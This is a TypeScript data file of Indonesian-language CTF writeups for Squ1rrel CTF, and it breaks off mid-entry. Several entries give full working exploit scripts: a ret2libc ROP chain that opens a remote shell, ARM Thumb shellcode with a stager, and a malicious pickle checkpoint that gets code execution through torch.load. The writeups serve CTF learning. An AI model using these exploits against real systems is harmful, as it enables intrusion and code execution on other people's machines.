import type { WriteUp } from '../types';

// Squ 1rrel — 18 writeups
export const squ1rrelCtfWriteups: WriteUp[] = [
  {
    "id": "squ1rrel-misc-loremipsum",
    "title": "- misc/lorem-ipsum",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge - misc/lorem-ipsum",
    "problemDescription": "Challenge ini berupa satu file PDF: `lorem_ipsum_dolor.pdf`.\nHint deskripsi bilang naskah sudah \"dipotong\" (cut down). Itu mengarah ke kemungkinan data lama masih tertinggal di file, walaupun tampilan PDF terbaru sudah berubah.\n\nFlag berhasil didapat dari revisi PDF lama yang masih menempel di dalam file lewat mekanisme **incremental update** PDF.",
    "tools": [],
    "analysis": "Cek isi direktori:\n- hanya ada `lorem_ipsum_dolor.pdf`\n\nCek metadata cepat:\n- file terlihat normal, tidak terenkripsi\n- tidak ada attachment (`pdfdetach -list` = 0 file)",
    "solution": [
      {
        "title": "2. Cari indikasi data tersembunyi",
        "content": "Ekstrak teks langsung dari PDF terbaru pakai `pdftotext`.\nHasilnya hanya lorem ipsum + kalimat penutup, tidak ada flag.\n\nLalu cek struktur bagian akhir file (`tail -n ...`), ketemu hal penting:\n- ada **dua** blok `xref/trailer/startxref/%%EOF`\n- di antara blok itu ada catatan `Written by MuPDF ...`\n- trailer kedua punya `/Prev ...`\n\nIni pola khas PDF yang pernah di-edit lalu disimpan sebagai incremental update.\nArtinya: konten lama belum hilang, cuma ditimpa referensi objek baru."
      },
      {
        "title": "3. Recovery revisi lama",
        "content": "Ambil byte file sampai `%%EOF` pertama saja.\nHasilnya jadi PDF revisi awal (sebelum update terakhir).\n\nSetelah diekstrak teks dari revisi awal, flag muncul di bagian isi halaman:\n\n`squ1rrel{d4n6_17_y0u_f0und_m3!}`"
      },
      {
        "title": "Kenapa teknik ini berhasil",
        "content": "Format PDF mendukung append update: perubahan baru ditambahkan di belakang file, bukan selalu rewrite total.\nKalau editor hanya \"memotong\" konten versi terbaru, data versi lama masih bisa tertinggal dan dipulihkan dengan membaca revision sebelumnya."
      },
      {
        "title": "Isi solve.py (ringkas)",
        "content": "1. Baca `lorem_ipsum_dolor.pdf` sebagai bytes.\n2. Cari `%%EOF` pertama.\n3. Simpan potongan bytes sampai titik itu sebagai `_rev0.pdf`.\n4. Jalankan `pdftotext _rev0.pdf -`.\n5. Regex `squ1rrel\\{[^}]+\\}` untuk ambil flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nPDF_NAME = \"lorem_ipsum_dolor.pdf\"\r\nFLAG_RE = re.compile(r\"squ1rrel\\{[^}]+\\}\")\r\n\r\n\r\ndef extract_first_revision(pdf_path: Path) -> Path:\r\n    data = pdf_path.read_bytes()\r\n    eof = data.find(b\"%%EOF\")\r\n    if eof == -1:\r\n        raise RuntimeError(\"PDF tidak memiliki penanda %%EOF\")\r\n\r\n    # Ambil revision pertama: data sampai EOF pertama.\r\n    end = eof + len(b\"%%EOF\\n\")\r\n    out = pdf_path.with_name(\"_rev0.pdf\")\r\n    out.write_bytes(data[:end])\r\n    return out\r\n\r\n\r\ndef pdf_to_text(pdf_path: Path) -> str:\r\n    proc = subprocess.run(\r\n        [\"pdftotext\", str(pdf_path), \"-\"],\r\n        check=True,\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.PIPE,\r\n        text=True,\r\n    )\r\n    return proc.stdout\r\n\r\n\r\ndef main() -> None:\r\n    pdf = Path(PDF_NAME)\r\n    if not pdf.exists():\r\n        raise SystemExit(f\"File tidak ditemukan: {pdf}\")\r\n\r\n    rev0 = extract_first_revision(pdf)\r\n    text = pdf_to_text(rev0)\r\n\r\n    m = FLAG_RE.search(text)\r\n    if not m:\r\n        raise SystemExit(\"Flag tidak ditemukan\")\r\n\r\n    print(m.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{d4n6_17_y0u_f0und_m3!}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-pwn-b2b",
    "title": "- pwn/b2b",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Challenge ini keliatan simpel, dan emang arahnya classic stack overflow + ret2libc.",
    "problemDescription": "Challenge ini keliatan simpel, dan emang arahnya classic stack overflow + ret2libc.",
    "tools": [],
    "analysis": "Di fungsi `back2basics` ada pola ini:\n\n- Buffer lokal di stack ukuran `0x40`\n- Input pakai `read(0, buf, 0x100)`\n\nArtinya kita bisa nulis jauh melewati buffer.\nOffset ke RIP jadi:\n- `0x40` (buffer)\n- `+ 0x8` (saved RBP)\n- total `0x48`\n\nJadi payload untuk kontrol RIP = `b'A' * 0x48 + rop_chain`.",
    "solution": [
      {
        "title": "Informasi challenge",
        "content": "- Nama: `b2b`\n- Kategori: `pwn`\n- Service: `nc challs.squ1rrel.dev 5000`"
      },
      {
        "title": "Recon awal",
        "content": "Pertama saya cek proteksi binary:\n\n- Arsitektur: `amd64`\n- `NX: enabled`\n- `PIE: disabled` (base binary fix, enak buat ROP)\n- `Canary: tidak ada`\n- `RELRO: partial`\n\nDari sini sudah kebayang: overwrite RIP langsung memungkinkan, tapi karena NX aktif kita butuh ROP (bukan shellcode di stack)."
      },
      {
        "title": "Kenapa ret2libc",
        "content": "Tidak ada fungsi `win()` atau semacamnya, jadi strategi paling stabil:\n\n1. Leak alamat libc runtime (pakai `puts` terhadap `puts@got`)\n2. Hitung base libc\n3. Panggil `system(\"/bin/sh\")`\n\nKarena PIE off, alamat gadget dan simbol di binary tetap."
      },
      {
        "title": "ROP stage 1 (leak)",
        "content": "Chain stage 1:\n- `pop rdi; ret`\n- argumen = `puts@got`\n- call `puts@plt`\n- balik lagi ke `back2basics` biar dapat input kedua\n\nDengan ini kita dapat nilai real `puts` dari libc di proses remote."
      },
      {
        "title": "ROP stage 2 (shell)",
        "content": "Setelah base libc ketemu:\n- `system = libc_base + offset_system`\n- `binsh = libc_base + offset_string_/bin/sh`\n\nChain stage 2:\n- `ret` (alignment stack)\n- `pop rdi; ret`\n- `binsh`\n- `system`\n\nLalu kirim command baca flag."
      },
      {
        "title": "Hasil",
        "content": "Flag yang didapat:",
        "code": "squ1rrel{pr1d3_4nd_pr3jud1ce_gr34t_g4tsby_4nd_ret2libc}"
      },
      {
        "title": "Catatan singkat",
        "content": "Sempat ada jebakan kecil pas debugging karena interpretasi alur `leave; ret`, tapi setelah ditrace ulang dengan benar, ini murni overflow langsung ke return address di offset `0x48`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nexe = ELF('./b2b', checksec=False)\r\ncontext.binary = exe\r\ncontext.log_level = 'info'\r\n\r\nHOST = 'challs.squ1rrel.dev'\r\nPORT = 5000\r\n\r\nPOP_RDI = 0x40117e\r\nRET = 0x40101a\r\nOFFSET = 0x48\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process(exe.path)\r\n\r\n\r\ndef send_payload(io, chain: bytes):\r\n    io.recvuntil(b'name your favorite classic:\\n')\r\n    io.send(flat(\r\n        b'A' * OFFSET,\r\n        chain,\r\n    ))\r\n\r\n\r\ndef leak_puts(io):\r\n    rop = flat(\r\n        POP_RDI,\r\n        exe.got['puts'],\r\n        exe.plt['puts'],\r\n        exe.sym['back2basics'],\r\n    )\r\n    send_payload(io, rop)\r\n\r\n    io.recvuntil(b'class dismissed.\\n')\r\n    leak = u64(io.recvline().strip().ljust(8, b'\\x00'))\r\n    log.success(f'puts leak: {hex(leak)}')\r\n    return leak\r\n\r\n\r\ndef exploit(io, libc_path='/lib/x86_64-linux-gnu/libc.so.6'):\r\n    libc = ELF(libc_path, checksec=False)\r\n\r\n    puts_leak = leak_puts(io)\r\n    libc.address = puts_leak - libc.sym['puts']\r\n    log.success(f'libc base: {hex(libc.address)}')\r\n\r\n    system = libc.sym['system']\r\n    binsh = next(libc.search(b'/bin/sh\\x00'))\r\n\r\n    rop2 = flat(\r\n        RET,\r\n        POP_RDI,\r\n        binsh,\r\n        system,\r\n    )\r\n    send_payload(io, rop2)\r\n\r\n    io.recvuntil(b'class dismissed.\\n')\r\n    io.sendline(b'cat flag* 2>/dev/null || cat /flag 2>/dev/null || ls')\r\n    out = io.recv(timeout=1) or b''\r\n    print(out.decode('latin-1', errors='ignore'))\r\n    io.interactive()\r\n\r\n\r\nif __name__ == '__main__':\r\n    io = start()\r\n    exploit(io)"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{pr1d3_4nd_pr3jud1ce_gr34t_g4tsby_4nd_ret2libc}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-pwn-echo",
    "title": "pwn/echo",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Challenge ini kelihatannya sederhana, tapi ternyata ada kombinasi bug yang enak banget buat dieksploit.",
    "problemDescription": "Challenge ini kelihatannya sederhana, tapi ternyata ada kombinasi bug yang enak banget buat dieksploit.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Info awal",
        "content": "Binary `echo` adalah:\n- ELF 32-bit ARM (PIE)\n- Full RELRO\n- Tidak ada canary\n- Stack executable (`GNU_STACK RWE`)\n\nService jalan via qemu-user:\n- `qemu-arm -L /usr/arm-linux-gnueabi ./echo`"
      },
      {
        "title": "Recon cepat",
        "content": "Fungsi utama (hasil disassembly) intinya begini:\n\n1. `puts(\"Echo\")`\n2. `fgets(buf, 0x10, stdin)` ke buffer stack yang sebenarnya cuma 8 byte\n3. `printf(buf)` (format string vuln)\n4. `read(0, buf, 0x10)` lagi ke buffer yang sama\n5. `return`\n\nJadi ada dua bug sekaligus:\n- **Format String** di `printf(buf)`\n- **Stack Overflow** karena buffer 8 byte diisi sampai 16 byte"
      },
      {
        "title": "Tujuan eksploitasi",
        "content": "Karena overflow dari `read` bisa overwrite saved LR, kita bisa kontrol PC saat fungsi return.\nMasalahnya kita butuh alamat stack untuk lompat ke shellcode.\n\nDi sini format string dipakai buat leak alamat:\n- payload: `%13$p`\n- remote selalu leak: `0x3ffffb74`\n\nDari kalibrasi runtime, alamat buffer stack yang dipakai `read` adalah:\n\n`buf_addr = leak - 0x18c`"
      },
      {
        "title": "Kenapa tidak langsung shellcode besar?",
        "content": "Overflow dari `read` cuma kasih kita 16 byte total:\n- 12 byte bebas\n- 4 byte terakhir dipakai jadi return address (PC)\n\nShellcode `cat flag.txt` jelas lebih panjang dari 12 byte.\nSolusinya: pakai **stager 12-byte**."
      },
      {
        "title": "Rantai exploit",
        "content": "1. Kirim `%13$p` untuk leak stack pointer.\n2. Kirim payload overflow 16 byte:\n   - 12 byte Thumb stager: `read(0, sp, 0xfe)`\n   - 4 byte return address: `buf_addr + 1` (bit Thumb aktif)\n3. Setelah return, eksekusi pindah ke stack (Thumb), stager jalan, lalu baca stage-2 dari socket ke stack.\n4. Kirim stage-2 shellcode (Thumb) yang melakukan open/sendfile untuk `flag.txt`.\n5. Flag keluar ke stdout koneksi."
      },
      {
        "title": "Kenapa Thumb?",
        "content": "Thumb bikin instruksi lebih pendek (2-byte), jadi bisa muat stager fungsional dalam 12 byte.\nKalau pakai ARM mode, ruang 12 byte terlalu mepet buat setup syscall yang layak."
      },
      {
        "title": "Hasil",
        "content": "Flag yang didapat dari service:\n\n`squ1rrel{i_l0v3_n1s@l@_h3_1s_s0_c00l}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nHOST = \"challs.squ1rrel.dev\"\r\nPORT = 5003\r\n\r\n# 12-byte thumb stager:\r\n# read(0, sp, 0xfe)\r\nSTAGER = bytes.fromhex(\"002069467f225200032700df\")\r\n\r\n# Thumb shellcode to cat flag.txt (generated once with pwntools shellcraft.cat)\r\nSTAGE2 = bytes.fromhex(\r\n    \"87ea070780b4dff8047001e02e747874\"\r\n    \"80b4dff8047001e0666c616780b46846\"\r\n    \"81ea01014ff0050741df05464ff00100\"\r\n    \"294682ea02026ff000434ff0bb0741df\"\r\n)\r\n\r\n# Remote calibration: buf_addr = leak(%13$p) - 0x18c\r\nLEAK_TO_BUF = 0x18C\r\n\r\ndef exploit(io):\r\n    io.recvuntil(b\"Echo\\n\")\r\n\r\n    # Leak a stable stack-ish pointer via format string\r\n    io.send(b\"%13$p\\n\")\r\n    leak = int(io.recvline().strip(), 16)\r\n    buf_addr = leak - LEAK_TO_BUF\r\n\r\n    log.info(f\"leak      = {hex(leak)}\")\r\n    log.info(f\"buf_addr  = {hex(buf_addr)}\")\r\n\r\n    # Overflow via read(0, buf, 0x10), set PC -> buf+1 (thumb)\r\n    payload = STAGER + p32(buf_addr + 1)\r\n    io.send(payload)\r\n\r\n    # Stager now reads stage2 onto stack and executes it\r\n    io.send(STAGE2)\r\n\r\n    # shellcode prints flag and exits\r\n    return io.recvrepeat(2)\r\n\r\n\r\ndef main():\r\n    context.log_level = \"info\"\r\n\r\n    if args.LOCAL:\r\n        io = process([\"qemu-arm\", \"-L\", \"armroot/sysroot\", \"./echo\"])\r\n    else:\r\n        io = remote(HOST, PORT)\r\n\r\n    data = exploit(io)\r\n    if data:\r\n        print(data.decode(\"latin1\", \"ignore\"), end=\"\")\r\n    io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{i_l0v3_n1s@l@_h3_1s_s0_c00l}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-pwn-yolo",
    "title": "- squ1rrel pwn/yolo",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge - squ1rrel pwn/yolo",
    "problemDescription": "",
    "tools": [],
    "analysis": "Dari disassembly `main` ditemukan:\n- Program baca `/flag.txt` ke heap buffer `calloc(0x80)` (jadi isi flag ada di memori proses).\n- Program print status subcommand dengan pola:\n  - `snprintf(local_buf, 0x100, \"[*] running: %s\\n\", argv[1])`\n  - `printf(local_buf)`  **(BUG format string)**\n\nKarena `printf` dipanggil dengan user-controlled format string, kita bisa baca data stack/arg dengan `%n$...`.\n\nDengan uji lokal (`./yolo_status '%41$s'`) didapat:\n- `%41$s` menunjuk ke pointer heap buffer yang berisi isi `/flag.txt`.\n- Output jadi langsung mencetak flag.\n\nJadi primitive exploit final:\n1. RCE via unsafe `torch.load`\n2. Dari RCE jalankan `/app/yolo_status '%41$s'`\n3. Output response API berisi flag\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: `pwn`\n- Judul: `pwn/yolo`\n- Target: `http://104.197.153.197/`\n\n---"
      },
      {
        "title": "Recon Awal",
        "content": "Di folder challenge ada file utama:\n- `server.py` (Flask app)\n- `yolo_status` (ELF 64-bit, SUID root di Dockerfile)\n\nHasil `checksec` untuk `yolo_status`:\n- No PIE\n- NX enabled\n- No canary\n- Partial RELRO\n\n`server.py` punya endpoint penting:\n- `POST /api/model/build`\n\nPada endpoint ini ada alur:\n1. upload file `weights` (`.pt`)\n2. disimpan ke `/tmp/...pt`\n3. dipanggil `torch.load(path, map_location=\"cpu\")`\n\nIni langsung red flag karena `torch.load` menggunakan pickle dan bisa mengeksekusi code saat deserialisasi object berbahaya.\n\n---"
      },
      {
        "title": "Exploitation Flow",
        "content": "Saya buat malicious checkpoint `.pt` berisi object dengan `__reduce__`.\nSaat di-`torch.load` oleh server, object itu menjalankan:\n\n\n\nKemudian hasil command diangkat jadi exception, supaya message exception kembali ke JSON error API.\n\nServer membalas:\n- `pretrained validation failed: ... [*] running: squ1rrel{...}`\n\nDari response itu solver regex flag dan print.\n\n---",
        "code": "subprocess.check_output(['/app/yolo_status', '%41$s'])"
      },
      {
        "title": "Catatan Penting",
        "content": "- Challenge ini chain dua bug:\n  - insecure deserialization (`torch.load`)\n  - format string di binary SUID helper\n- Kalau salah satu ditutup, exploit chain putus:\n  - `torch.load(..., weights_only=True)` + validasi ketat format\n  - ganti `printf(buf)` jadi `printf(\"%s\", buf)`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport json\r\nimport re\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nimport requests\r\nimport torch\r\n\r\n\r\nclass EvilCheckpoint:\r\n    def __reduce__(self):\r\n        code = (\r\n            \"import subprocess;\"\r\n            \"raise Exception(subprocess.check_output(['/app/yolo_status','%41$s']).decode())\"\r\n        )\r\n        payload = f\"__import__('builtins').exec({code!r})\"\r\n        return (eval, (payload,))\r\n\r\n\r\ndef extract_flag(text: str):\r\n    patterns = [\r\n        r\"squ1rrel\\{[^}]+\\}\",\r\n        r\"flag\\{[^}]+\\}\",\r\n        r\"ctf\\{[^}]+\\}\",\r\n    ]\r\n    for pat in patterns:\r\n        m = re.search(pat, text, re.IGNORECASE)\r\n        if m:\r\n            return m.group(0)\r\n    return None\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Exploit solver for squ1rrel pwn/yolo\")\r\n    parser.add_argument(\r\n        \"--url\",\r\n        default=\"http://104.197.153.197/api/model/build\",\r\n        help=\"Target /api/model/build endpoint\",\r\n    )\r\n    parser.add_argument(\r\n        \"--out\",\r\n        default=\"payload_flag.pt\",\r\n        help=\"Local path to generated malicious checkpoint\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    out_path = Path(args.out)\r\n    torch.save(EvilCheckpoint(), out_path)\r\n\r\n    with out_path.open(\"rb\") as f:\r\n        resp = requests.post(\r\n            args.url,\r\n            files={\"weights\": (out_path.name, f, \"application/octet-stream\")},\r\n            timeout=30,\r\n        )\r\n\r\n    print(f\"[+] HTTP {resp.status_code}\")\r\n    body = resp.text\r\n\r\n    try:\r\n        parsed = resp.json()\r\n        print(json.dumps(parsed, indent=2))\r\n    except Exception:\r\n        print(body)\r\n\r\n    flag = extract_flag(body)\r\n    if not flag:\r\n        print(\"[-] Flag not found in response\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{y0u_0nly_fl@g_1nce_5d7fb1a}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-rev-squ1rrel-o-tron",
    "title": "- rev/squ1rrel-o-tron",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Challenge ini keliatannya simpel dari sisi service (`nc ... 5002`): server ngasih `nonce` 32 byte (hex), kita harus balas 16 byte (hex), 5 ronde, timeout 5 detik. Tapi fungsi `F(nonce)`-nya sengaja disembunyikan.",
    "problemDescription": "Challenge ini keliatannya simpel dari sisi service (`nc ... 5002`): server ngasih `nonce` 32 byte (hex), kita harus balas 16 byte (hex), 5 ronde, timeout 5 detik. Tapi fungsi `F(nonce)`-nya sengaja disembunyikan.",
    "tools": [],
    "analysis": "Di folder challenge ada dua file:\n- `linux.pdf`\n- `server.py`\n\n`server.py` cuma kasih skeleton dan jelas bahwa targetnya adalah ngitung `want = F(nonce)`.\n\nPetunjuk penting datang dari PDF: file ini bukan PDF biasa, tapi ada JavaScript besar dengan embedded VM Linux (TinyEMU-style).",
    "solution": [
      {
        "title": "2. Bongkar isi PDF",
        "content": "Saya ekstrak JavaScript utama dari `linux.pdf` dan dapet beberapa file embedded:\n- `kernel-riscv32.bin`\n- `bbl32.bin`\n- `vm_32.cfg`\n- root filesystem (`root/files/...`)\n\nDi rootfs ada binary `/root/chall` (ELF RISC-V kecil, stripped). Ini kandidat kuat implementasi `F`."
      },
      {
        "title": "3. Reverse binary `chall`",
        "content": "`chall` baca tepat 64 hex char (32 byte), proses internal, lalu print 32 hex char (16 byte).\n\nMasalahnya: disassembly nunjukkin 2 instruksi RISC-V yang tidak dikenal tool umum (`funct7=126` dan `funct7=127`), jadi kalau dijalankan di `qemu-riscv32` langsung `SIGILL`.\n\nAwalnya ini terlihat buntu, tapi ternyata opcode custom ini bisa direcover dari **decoder CPU di JavaScript emulator** (yang ada di `linux.pdf`)."
      },
      {
        "title": "4. Ambil semantik opcode custom dari decoder asm.js",
        "content": "Saya cari blok `case 51` (opcode OP / R-type) di `asm.js` hasil ekstrak PDF.\n\nDari situ ketemu:\n- `funct7=126` (dengan `funct3=0`) dipakai untuk set state internal global: `state = rs1`.\n- `funct7=127` (dengan `funct3=0`) melakukan transform nonlinear berbasis:\n  - state global\n  - operasi rotasi\n  - `imul`\n  - S-box 256 byte dari memory initializer emulator\n\nS-box-nya saya ambil dari offset memory yang dipakai decoder (`d[10304 + ...]`)."
      },
      {
        "title": "5. Rekonstruksi fungsi F di Python",
        "content": "Setelah semantik opcode jelas, saya translasi 1:1 ke Python:\n- parse nonce jadi 8 word little-endian\n- inisialisasi state dari word pertama\n- loop luar 4096 kali (`+0x19f3dc31` sampai `0x3dc31000`)\n- loop dalam 8 word dengan konstanta `0x9f0ce81c`\n- apply custom op (funct7=127)\n- hasil akhir: ambil 16 byte pertama, hex-encode"
      },
      {
        "title": "6. Validasi ke service",
        "content": "Solver berhasil lewat semua 5 ronde dan dapat flag:\n\n`squ1rrel{why_run_l1nux_0n_4_pr1nt3r_wh3n_y0u_c4n_run_l1nux_0n_4_pdf}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\n\r\nHOST = \"challs.squ1rrel.dev\"\r\nPORT = 5002\r\n\r\nSBOX = bytes.fromhex(\r\n    \"6c3978ce3df683dd30f4f55f138e351c4d936fc71b198043c6f0cb2fd147befa\"\r\n    \"948aad5b867556b2095ea6ef11b1c2e0f8362051a11a7731080514e6df9e8dde\"\r\n    \"6ea2c9d34e9dbb76923364ab91d757b03a4245079cdbc15216841fb3e78f34bf\"\r\n    \"9a241299f92700508cd9f1eb3e740e4cc8cd62b55c90bcecfefdca211e586d23\"\r\n    \"d296f37d7101497ce22e7948da38d085bd44ed984f0d250cb7677e6a2a157af2\"\r\n    \"6606c553b92202a3882bb6296328b4e1e341cfa83ccc87615d034b6854f7a59b\"\r\n    \"d895d5aaba824a1da97fe4c49fe87304eeff556b46178b10d489405a970f26ae\"\r\n    \"e5a40ad62c60dca0a78165acfc0b1859af7069372de9b8fb3f323b72eac37bc0\"\r\n)\r\n\r\nDELTA_INNER = 0x9F0CE81C\r\nDELTA_OUTER = 0x19F3DC31\r\nOUTER_TARGET = 0x3DC31000\r\n\r\n\r\ndef rotl32(x: int, n: int) -> int:\r\n    n &= 31\r\n    x &= 0xFFFFFFFF\r\n    if n == 0:\r\n        return x\r\n    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF\r\n\r\n\r\ndef sb_word(v: int) -> int:\r\n    return (\r\n        SBOX[v & 0xFF]\r\n        | (SBOX[(v >> 8) & 0xFF] << 8)\r\n        | (SBOX[(v >> 16) & 0xFF] << 16)\r\n        | (SBOX[(v >> 24) & 0xFF] << 24)\r\n    ) & 0xFFFFFFFF\r\n\r\n\r\ndef op127(x: int, h: int, state: int) -> tuple[int, int]:\r\n    o = SBOX[(h ^ x ^ state) & 0xFF]\r\n    o = ((o << 8) | o | (o << 16) | (o << 24)) & 0xFFFFFFFF\r\n    o ^= x\r\n\r\n    m = (state ^ h) & 31\r\n    m = (rotl32(o, m) + ((sb_word(h) * h) & 0xFFFFFFFF)) & 0xFFFFFFFF\r\n\r\n    o2 = m ^ state\r\n    out = (sb_word(o2) ^ m) & 0xFFFFFFFF\r\n\r\n    n2 = (m + state) & 0xFFFFFFFF\r\n    state2 = (sb_word(n2) ^ o2) & 0xFFFFFFFF\r\n    return out, state2\r\n\r\n\r\ndef F(nonce: bytes) -> bytes:\r\n    w = [int.from_bytes(nonce[i * 4 : (i + 1) * 4], \"little\") for i in range(8)]\r\n\r\n    # opcode funct7=126 side effect observed in emulator decoder\r\n    state = w[0]\r\n\r\n    outer = 0\r\n    while outer != OUTER_TARGET:\r\n        inner = outer\r\n        for i in range(8):\r\n            x = w[i] ^ inner\r\n            h = w[(i + 1) & 7]\r\n            w[i], state = op127(x, h, state)\r\n            inner = (inner + DELTA_INNER) & 0xFFFFFFFF\r\n        outer = (outer + DELTA_OUTER) & 0xFFFFFFFF\r\n\r\n    out = b\"\".join(v.to_bytes(4, \"little\") for v in w)\r\n    return out[:16]\r\n\r\n\r\ndef solve(host: str = HOST, port: int = PORT) -> str:\r\n    with socket.create_connection((host, port), timeout=8) as sock:\r\n        f = sock.makefile(\"rwb\", buffering=0)\r\n\r\n        banner = f.readline().decode(\"ascii\", errors=\"ignore\").rstrip(\"\\n\")\r\n        print(banner)\r\n\r\n        while True:\r\n            line = f.readline()\r\n            if not line:\r\n                raise RuntimeError(\"connection closed\")\r\n\r\n            text = line.decode(\"ascii\", errors=\"ignore\").strip()\r\n\r\n            m = re.match(r\"round\\s+\\d+:\\s+([0-9a-f]{64})$\", text)\r\n            if m:\r\n                nonce = bytes.fromhex(m.group(1))\r\n                ans = F(nonce).hex().encode() + b\"\\n\"\r\n                f.write(ans)\r\n                continue\r\n\r\n            if text.startswith(\"nope\"):\r\n                raise RuntimeError(text)\r\n\r\n            if text.startswith(\"squ1rrel{\"):\r\n                return text\r\n\r\n\r\ndef main() -> None:\r\n    flag = solve()\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{why_run_l1nux_0n_4_pr1nt3r_wh3n_y0u_c4n_run_l1nux_0n_4_pdf}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-blog",
    "title": "CTF - web/blog",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge CTF - web/blog",
    "problemDescription": "Aplikasi memakai React Router (SSR). Route `/admin` memang diproteksi Cloudflare Access (Zero Trust), tapi endpoint data route milik React Router yaitu `/admin.data` **tidak ikut diproteksi**. Dari endpoint ini, data sensitif loader admin tetap bisa diambil tanpa login.\n\nIntinya: proteksi dipasang di UI route (`/admin`), tapi lupa menutup data endpoint alternatif (`/admin.data`).",
    "tools": [],
    "analysis": "Dari manifest React Router, ketemu route:\n- `routes/admin`\n- module JS: `/assets/admin-<hash>.js`\n- route ini punya `loader` (`hasLoader: true`)\n\nDi module admin terlihat halaman merender string:\n- `squ1rrel{zero_trust?` + data dari loader\n\nJadi flag dibentuk dari dua bagian:\n1. Prefix statis di frontend admin module\n2. Suffix dinamis dari loader route admin",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: web misc\n- Judul: `web/blog`\n- Target: `http://blog.fraud.llc/`\n- Deskripsi: `I spent so long securing my blog. hope you enjoy`"
      },
      {
        "title": "1) Recon awal homepage",
        "content": "Saya mulai dari:\n\n\nDari HTML terlihat:\n- Ini aplikasi React Router SSR.\n- Ada link ke `/admin`.\n- Ada file manifest/bundle JavaScript yang bisa diinspeksi.",
        "code": "curl -i http://blog.fraud.llc/"
      },
      {
        "title": "2) Cek akses `/admin`",
        "content": "Respons `302` redirect ke halaman Cloudflare Access login. Artinya route utama admin memang ditutup.",
        "code": "curl -i https://blog.fraud.llc/admin"
      },
      {
        "title": "4) Uji endpoint data route",
        "content": "Karena React Router data request sering pakai `*.data`, saya uji:\n\n\nRespons berhasil (`200`) dan mengembalikan data loader admin, termasuk suffix:\n- `_still_have_to_trust_your_configuration}`\n\nJadi walaupun `/admin` ke-block Zero Trust, data sensitif tetap bocor lewat `/admin.data`.",
        "code": "curl -i http://blog.fraud.llc/admin.data"
      },
      {
        "title": "Akar Masalah Teknis",
        "content": "Masalah utamanya bukan bypass cryptography/auth token, tapi **misconfiguration access control**:\n- Proteksi cuma mengunci `/admin`\n- Endpoint data framework (`/admin.data`) lupa disamakan policy-nya\n\nIni sering kejadian pada app modern (Next/Remix/React Router) karena satu halaman punya beberapa surface endpoint: HTML route, data route, kadang API route."
      },
      {
        "title": "Rekomendasi Perbaikan",
        "content": "1. Terapkan policy Zero Trust ke semua route turunan dan data endpoint terkait (`/admin*`, termasuk `*.data`, query `_data`, dsb).\n2. Jangan kirim data sensitif dari loader tanpa validasi session di sisi aplikasi.\n3. Tambahkan integration test untuk endpoint non-UI (data/API), bukan hanya test akses halaman HTML.\n4. Audit seluruh route framework-generated endpoint setiap deploy."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
